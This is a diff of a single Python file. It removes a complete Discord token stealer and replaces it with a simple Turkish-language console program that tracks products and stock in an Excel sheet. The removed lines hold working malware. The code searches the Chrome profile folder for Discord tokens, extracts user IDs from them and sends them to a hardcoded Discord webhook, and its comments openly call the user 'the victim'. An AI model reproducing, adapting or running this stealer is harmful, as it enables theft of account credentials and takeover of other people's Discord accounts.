@@ -1,138 +1,95 @@
-import base64
-import json
+
+import pandas as pd
 import os
-import re
-import urllib.request
-from pathlib import Path
 
-TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{27,}"  # Adjusted to be more inclusive
-REQUEST_HEADERS = {
-    "Content-Type": "application/json",
-    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11",
-}
-WEBHOOK_URL = "https://discord.com/api/webhooks/1395031147536191558/qyXlM0qkSL5b8WCokpb91MXqxqAGoksj_AEf9MxUtyKR95zygoltPRZbbuCmip5eIA_z"
+DOSYA_ADI = "urunler.xlsx"
 
-def make_post_request(api_url: str, data: dict[str, str]) -> int:
-    if not api_url.startswith(("http", "https")):
-        raise ValueError("Invalid URL")
+# Açılış mesajı
+print("""
+***************************************
+  ÜRÜN TAKİP OTOMASYONU - v1.0
+  Geliştirici: Halilcan Elitok
+***************************************
+""")
 
-    request = urllib.request.Request(  # noqa: S310
-        api_url, data=json.dumps(data).encode(),
-        headers=REQUEST_HEADERS,
-    )
+# Excel dosyasını yükle veya boş bir DataFrame oluştur
+if os.path.exists(DOSYA_ADI):
+    df = pd.read_excel(DOSYA_ADI)
+else:
+    df = pd.DataFrame(columns=["Ürün Kodu", "Ürün Adı", "Fiyat", "Stok Miktarı", "Açıklama"])
 
-    try:
-        with urllib.request.urlopen(request) as response:  # noqa: S310
-            return response.status
-    except urllib.error.URLError as e:
-        print(f"Failed to send request: {e}")
-        return None
+# 1. Ürünleri listele
+def urunleri_listele():
+    print("\n📦 Mevcut Ürünler:")
+    print(df.to_string(index=False))
 
-def get_tokens_from_file(file_path: Path) -> list[str] | None:
-    try:
-        file_contents = file_path.read_text(encoding="utf-8", errors="ignore")
-    except PermissionError:
-        return None
+# 2. Yeni ürün ekle
+def yeni_urun_ekle():
+    urun = {
+        "Ürün Kodu": input("Ürün Kodu: "),
+        "Ürün Adı": input("Ürün Adı: "),
+        "Fiyat": float(input("Fiyat: ")),
+        "Stok Miktarı": int(input("Stok Miktarı: ")),
+        "Açıklama": input("Açıklama: ")
+    }
+    global df
+    df = df.append(urun, ignore_index=True)
+    print("✅ Ürün eklendi.")
 
-    tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)
-    return tokens or None
+# 3. Stok güncelle
+def stok_guncelle():
+    kod = input("Stok güncellenecek ürün kodu: ")
+    miktar = int(input("Yeni stok miktarı: "))
+    if kod in df["Ürün Kodu"].values:
+        df.loc[df["Ürün Kodu"] == kod, "Stok Miktarı"] = miktar
+        print("✅ Stok güncellendi.")
+    else:
+        print("❌ Ürün kodu bulunamadı.")
 
-def get_user_id_from_token(token: str) -> str | None:
-    """Confirm that the portion of a string before the first dot can be decoded.
+# 4. Stokta olan ürünleri listele
+def stokta_olanlar():
+    mevcut = df[df["Stok Miktarı"] > 0]
+    print("\n📦 Stokta Olan Ürünler:")
+    print(mevcut.to_string(index=False))
 
-    Decoding from base64 offers a useful, though not infallible, method for identifying
-    potential Discord tokens. This is informed by the fact that the initial
-    segment of a Discord token usually encodes the user ID in base64. However,
-    this test is not guaranteed to be 100% accurate in every case.
+# 5. Ürün sil
+def urun_sil():
+    kod = input("Silinecek ürün kodu: ")
+    global df
+    if kod in df["Ürün Kodu"].values:
+        df = df[df["Ürün Kodu"] != kod]
+        print("🗑️ Ürün silindi.")
+    else:
+        print("❌ Ürün bulunamadı.")
 
-    Returns
-    -------
-        A string representing the Discord user ID to which the token belongs,
-        if the first part of the token can be successfully decoded. Otherwise,
-        None.
+# 6. Excel'e kaydet
+def veriyi_kaydet():
+    df.to_excel(DOSYA_ADI, index=False)
+    print(f"💾 Excel dosyasına kaydedildi: {DOSYA_ADI}")
 
-    """
-    try:
-        discord_user_id = base64.b64decode(
-            token.split(".", maxsplit=1)[0] + "==",
-        ).decode("utf-8")
-    except (UnicodeDecodeError, base64.binascii.Error):
-        return None
+# Menü
+while True:
+    print("\n--- ÜRÜN OTOMASYONU ---")
+    print("1. Ürünleri Listele")
+    print("2. Yeni Ürün Ekle")
+    print("3. Stok Güncelle")
+    print("4. Stokta Olanları Göster")
+    print("5. Ürün Sil")
+    print("6. Kaydet ve Çık")
+    secim = input("Seçim (1-6): ")
 
-    return discord_user_id
-
-def get_tokens_from_path(base_path: Path) -> dict[str, set] | None:
-    """Collect discord tokens for each user ID.
-
-    to manage the occurrence of both valid and expired Discord tokens, which happens when a
-    user updates their password, triggering a change in their token. Lacking
-    the capability to differentiate between valid and expired tokens without
-    making queries to the Discord API, the function compiles every discovered
-    token into the returned set. It is designed for these tokens to be
-    validated later, in a process separate from the initial collection and not
-    on the victim's machine.
-
-    Returns
-    -------
-        user id mapped to a set of potential tokens
-
-    """
-    file_paths = [file for file in base_path.iterdir() if file.is_file()]
-
-    id_to_tokens: dict[str, set] = {}
-
-    for file_path in file_paths:
-        potential_tokens = get_tokens_from_file(file_path)
-
-        if potential_tokens is None:
-            continue
-
-        for potential_token in potential_tokens:
-            discord_user_id = get_user_id_from_token(potential_token)
-
-            if discord_user_id is None:
-                continue
-
-            if discord_user_id not in id_to_tokens:
-                id_to_tokens[discord_user_id] = set()
-
-            id_to_tokens[discord_user_id].add(potential_token)
-
-    # Ensure only one token per user ID
-    id_to_single_token = {user_id: next(iter(tokens)) for user_id, tokens in id_to_tokens.items()}
-
-    return id_to_single_token or None
-
-def send_tokens_to_webhook(
-    webhook_url: str, user_id_to_token: dict[str, set[str]],
-) -> int:
-    """Caution: In scenarios where the victim has logged into multiple Discord
-    accounts or has frequently changed their password, the accumulation of
-    tokens may result in a message that surpasses the character limit,
-    preventing it from being sent. There are no plans to introduce code
-    modifications to segment the message for compliance with character
-    constraints.
-    """  # noqa: D205
-    fields: list[dict] = []
-
-    for user_id, tokens in user_id_to_token.items():
-        fields.append({
-            "name": user_id,
-            "value": "".join(tokens),
-        })
-
-    data = {"content": "Found tokens", "embeds": [{"fields": fields}]}
-
-    return make_post_request(webhook_url, data)
-
-def main() -> None:
-    chrome_path = (
-        Path(os.getenv("LOCALAPPDATA")) /
-        "Google" / "Chrome" / "User Data" / "Default"
-    )
-    tokens = get_tokens_from_path(chrome_path)
-    if tokens:
-        send_tokens_to_webhook(WEBHOOK_URL, tokens)
-
-if __name__ == "__main__":
-    main()
+    if secim == "1":
+        urunleri_listele()
+    elif secim == "2":
+        yeni_urun_ekle()
+    elif secim == "3":
+        stok_guncelle()
+    elif secim == "4":
+        stokta_olanlar()
+    elif secim == "5":
+        urun_sil()
+    elif secim == "6":
+        veriyi_kaydet()
+        break
+    else:
+        print("❌ Geçersiz seçim.")
